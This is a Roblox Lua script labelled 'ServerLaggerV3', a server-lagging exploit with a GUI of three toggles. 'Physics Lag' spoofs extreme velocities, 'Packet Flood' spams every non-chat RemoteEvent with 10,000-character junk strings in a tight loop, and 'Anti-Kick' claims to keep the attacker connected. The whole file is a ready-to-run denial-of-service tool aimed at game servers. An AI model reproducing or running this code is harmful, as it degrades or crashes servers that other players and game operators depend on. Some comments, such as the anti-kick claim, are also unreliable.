local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local root = character:WaitForChild("HumanoidRootPart")
local hum = character:WaitForChild("Humanoid")

-- Fixes GUI not appearing
local parentUI = player:WaitForChild("PlayerGui")
local success, coreGui = pcall(function() return game:GetService("CoreGui") end)
if success and coreGui then parentUI = coreGui end

-- UI SETUP
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "ServerLaggerV3"
screenGui.ResetOnSpawn = false
screenGui.Parent = parentUI

local main = Instance.new("Frame")
main.Size = UDim2.new(0, 250, 0, 200)
main.Position = UDim2.new(0.1, 0, 0.5, -100)
main.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
main.BorderSizePixel = 0
main.Active = true
main.Draggable = true
main.Parent = screenGui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = main

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.Text = "LAG HUB [SERVER]"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
title.Font = Enum.Font.GothamBold
title.TextSize = 16
title.Parent = main

local function createToggle(name, pos)
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0.9, 0, 0, 40)
    btn.Position = UDim2.new(0.05, 0, 0, pos)
    btn.BackgroundColor3 = Color3.fromRGB(180, 50, 50)
    btn.Text = name .. ": OFF"
    btn.TextColor3 = Color3.new(1, 1, 1)
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 14
    btn.Parent = main
    
    local c = Instance.new("UICorner")
    c.CornerRadius = UDim.new(0, 6)
    c.Parent = btn
    
    return btn
end

local physicsBtn = createToggle("Physics Lag", 50)
local packetBtn = createToggle("Packet Flood", 100)
local kickSafe = createToggle("Anti-Kick", 150)

-- LOGIC
local physicsOn = false
local packetOn = false
local antiKick = false

-- 1. PHYSICS LAG (Forces server to recalculate your hitboxes constantly)
RunService.Stepped:Connect(function()
    if physicsOn then
        -- Rapidly toggles states to flood the server with physics updates
        hum:ChangeState(Enum.HumanoidStateType.Physics)
        root.Velocity = Vector3.new(0, 10000, 0) -- High velocity spoof
        task.wait()
        root.Velocity = Vector3.new(0, 0, 0)
    end
end)

physicsBtn.MouseButton1Click:Connect(function()
    physicsOn = not physicsOn
    physicsBtn.Text = physicsOn and "Physics Lag: ON" or "Physics Lag: OFF"
    physicsBtn.BackgroundColor3 = physicsOn and Color3.fromRGB(50, 180, 50) or Color3.fromRGB(180, 50, 50)
end)

-- 2. PACKET FLOOD (Floods remotes with junk)
local junk = string.rep("0", 10000)
local remotes = {}
for _, v in pairs(game:GetDescendants()) do
    if v:IsA("RemoteEvent") and not v.Name:lower():find("chat") then
        table.insert(remotes, v)
    end
end

task.spawn(function()
    while task.wait() do
        if packetOn then
            for i = 1, 10 do -- Multiply spam
                for _, remote in pairs(remotes) do
                    pcall(function()
                        remote:FireServer(junk, junk, junk)
                    end)
                end
            end
        end
    end
end)

packetBtn.MouseButton1Click:Connect(function()
    packetOn = not packetOn
    packetBtn.Text = packetOn and "Packet Flood: ON" or "Packet Flood: OFF"
    packetBtn.BackgroundColor3 = packetOn and Color3.fromRGB(50, 180, 50) or Color3.fromRGB(180, 50, 50)
end)

-- 3. ANTI-KICK (Prevents your local client from timing out while lagging)
kickSafe.MouseButton1Click:Connect(function()
    antiKick = not antiKick
    kickSafe.Text = antiKick and "Anti-Kick: ON" or "Anti-Kick: OFF"
    kickSafe.BackgroundColor3 = antiKick and Color3.fromRGB(50, 180, 50) or Color3.fromRGB(180, 50, 50)
    
    if antiKick then
        settings().Network.IncomingReplicationLag = 0 -- Keep your connection fresh
    end
end)
